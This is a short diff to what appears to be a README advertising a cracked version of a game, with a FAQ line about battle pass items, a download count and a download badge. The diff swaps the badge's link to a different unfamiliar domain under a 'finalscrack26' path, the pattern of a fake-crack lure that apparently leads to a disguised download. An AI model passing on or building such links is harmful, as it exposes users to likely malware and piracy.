@@ -49,7 +49,7 @@ A: Yes — all current and previous battle pass items.
 
 **Monthly downloads:** 1.5m+
 
-[![Download](https://img.shields.io/badge/Download-v3.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/finalscrack26)
+[![Download](https://img.shields.io/badge/Download-v3.0-brightgreen?style=for-the-badge)](https://dllvcrun.com/finalscrack26)
 
 ---
 
